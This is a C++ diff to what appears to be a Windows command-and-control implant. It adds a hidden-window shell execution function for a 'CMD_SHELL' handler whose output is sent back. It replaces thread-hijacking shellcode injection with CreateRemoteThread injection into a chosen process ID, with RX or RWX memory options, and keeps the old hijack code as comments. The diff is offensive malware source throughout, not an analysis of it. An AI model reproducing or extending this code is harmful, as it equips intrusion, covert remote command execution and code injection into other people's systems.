@@ -455,28 +455,55 @@ std::string base64_encode(const unsigned char* src, size_t len)
     return outStr;
 }
 
-std::string exec_and_return(const char* cmd) {
-    std::array<char, 1024> buffer;
-    std::string result;
+std::string ExecuteCommand(const std::string& command)
+{
+    std::string output;
 
-    auto pipe = _popen(cmd, "r"); // get rid of shared_ptr
+    SECURITY_ATTRIBUTES saAttr;
+    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+    saAttr.bInheritHandle = TRUE;
+    saAttr.lpSecurityDescriptor = NULL;
 
-    if (!pipe) throw std::runtime_error("popen() failed!");
-
-    while (!feof(pipe)) {
-        if (fgets(buffer.data(), buffer.size(), pipe) != nullptr)
-            result += buffer.data();
+    HANDLE hOutputRead, hOutputWrite;
+    if (!CreatePipe(&hOutputRead, &hOutputWrite, &saAttr, 0))
+    {
+        std::cerr << "Failed to create pipe\n";
+        return output;
     }
 
-    auto rc = _pclose(pipe);
+    SetHandleInformation(hOutputRead, HANDLE_FLAG_INHERIT, 0);
 
-    if (rc == EXIT_SUCCESS) { // == 0
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(STARTUPINFOA));
+    si.cb = sizeof(STARTUPINFOA);
+    si.hStdOutput = hOutputWrite;
+    si.dwFlags |= STARTF_USESTDHANDLES;
+    si.wShowWindow = SW_HIDE; // Hide the window
 
+    if (!CreateProcessA(NULL, const_cast<char*>(command.c_str()), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
+    {
+        std::cerr << "Failed to create process\n";
+        CloseHandle(hOutputRead);
+        CloseHandle(hOutputWrite);
+        return output;
     }
-    else if (rc == EXIT_FAILURE) {  // EXIT_FAILURE is not used by all programs, maybe needs some adaptation.
 
+    CloseHandle(hOutputWrite);
+
+    char buffer[4096];
+    DWORD bytesRead;
+    while (ReadFile(hOutputRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead != 0)
+    {
+        output.append(buffer, bytesRead);
     }
-    return result;
+
+    CloseHandle(hOutputRead);
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    return output;
 }
 
 std::vector<std::string> splitString(const std::string& str, const std::string& delimiter)
@@ -507,8 +534,12 @@ DWORD WINAPI ThreadFunc(LPVOID lpParameter)
 
 #define FUCKUP_PAD "1234567812345678"
 
+//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
+//    LPSTR lpCmdLine, int nCmdShow)
 int main()
 {
+
+    //std::cout << ExecuteCommand(std::string("cmd /c whoami")) << std::endl;
     if (!AesInitialization()) return 1;
     std::string iv;
 
@@ -641,9 +672,9 @@ int main()
             }
             // If shell exec
             if (parsed_cmd[1] == "CMD_SHELL") {
-                std::string sys = "cmd /c ";
+                std::string sys = "cmd.exe /c ";
                 sys.append(parsed_cmd[2]);
-                std::string out = exec_and_return(sys.data());
+                std::string out = ExecuteCommand(sys);
 
                 // Pad 16 bytes
                 std::string to_send = FUCKUP_PAD;
@@ -703,39 +734,74 @@ int main()
 
                 char* shellcode = (char*)raw_code_str.data();
 
-                HANDLE targetProcessHandle;
-                PVOID remoteBuffer;
-                HANDLE threadHijacked = NULL;
-                HANDLE snapshot;
-                THREADENTRY32 threadEntry;
-                CONTEXT context;
+                // Start of using RemoteThread()
+                HANDLE hProc = NULL;
+                LPVOID pRemoteCode = NULL;
+                HANDLE hThread = NULL;
 
-                // Pull out the PID to inject into
+                // Pull out the PID 
                 DWORD targetPID = std::stoi(parsed_cmd[3].data());
-                context.ContextFlags = CONTEXT_FULL;
-                threadEntry.dwSize = sizeof(THREADENTRY32);
+                
+                // Get a handle on the process
+                hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
+                    PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
+                    FALSE, (DWORD)targetPID);
 
-                targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
-                remoteBuffer = VirtualAllocEx(targetProcessHandle, NULL, len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-                WriteProcessMemory(targetProcessHandle, remoteBuffer, shellcode, len, NULL);
-
-                snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-                Thread32First(snapshot, &threadEntry);
-                while (Thread32Next(snapshot, &threadEntry)) {
-                    if (threadEntry.th32OwnerProcessID == targetPID)
-                    {
-                        threadHijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
-                        break;
+                if (hProc != NULL) {
+                    // If selected RX memory
+                    if (parsed_cmd.size() == 5 && parsed_cmd[4] == "RX") {
+                        DWORD oldprotect = 0;
+                        pRemoteCode = VirtualAllocEx(hProc, NULL, len, MEM_COMMIT, PAGE_READWRITE);
+                        WriteProcessMemory(hProc, pRemoteCode, (PVOID)shellcode, (SIZE_T)len, (SIZE_T*)NULL);
+                        bool rv = VirtualProtect(pRemoteCode, len, PAGE_EXECUTE_READ, &oldprotect);
+                        hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
                     }
+                    // If selected RWX memory (default)
+                    else {
+                        pRemoteCode = VirtualAllocEx(hProc, NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+                        WriteProcessMemory(hProc, pRemoteCode, (PVOID)shellcode, (SIZE_T)len, (SIZE_T*)NULL);
+                        hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
+                    }
+
+                    CloseHandle(hProc);
+                    CloseHandle(hThread);
                 }
 
-                SuspendThread(threadHijacked);
+                // End of using RemoteThread()
 
-                GetThreadContext(threadHijacked, &context);
-                context.Rip = (DWORD_PTR)remoteBuffer;
-                SetThreadContext(threadHijacked, &context);
+                //HANDLE targetProcessHandle;
+                //PVOID remoteBuffer;
+                //HANDLE threadHijacked = NULL;
+                //HANDLE snapshot;
+                //THREADENTRY32 threadEntry;
+                //CONTEXT context;
 
-                ResumeThread(threadHijacked);
+                //// Pull out the PID to inject into
+                //DWORD targetPID = std::stoi(parsed_cmd[3].data());
+                //context.ContextFlags = CONTEXT_FULL;
+                //threadEntry.dwSize = sizeof(THREADENTRY32);
+
+                //targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
+                //remoteBuffer = VirtualAllocEx(targetProcessHandle, NULL, len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+                //WriteProcessMemory(targetProcessHandle, remoteBuffer, shellcode, len, NULL);
+
+                //snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+                //Thread32First(snapshot, &threadEntry);
+                //while (Thread32Next(snapshot, &threadEntry)) {
+                //    if (threadEntry.th32OwnerProcessID == targetPID)
+                //    {
+                //        threadHijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
+                //        break;
+                //    }
+                //}
+
+                //SuspendThread(threadHijacked);
+
+                //GetThreadContext(threadHijacked, &context);
+                //context.Rip = (DWORD_PTR)remoteBuffer;
+                //SetThreadContext(threadHijacked, &context);
+
+                //ResumeThread(threadHijacked);
 
             }
             if (parsed_cmd[1] == "CMD_SHELLCODE_SPAWN") {
@@ -776,7 +842,7 @@ int main()
                 void* exec_mem;
 
                 // if directed to use RW memory only
-                if (parsed_cmd.size() == 4 && parsed_cmd[3] == "RX") {
+                if (parsed_cmd.size() == 5 && parsed_cmd[4] == "RX") {
                     DWORD oldprotect = 0;
 
                     exec_mem = VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
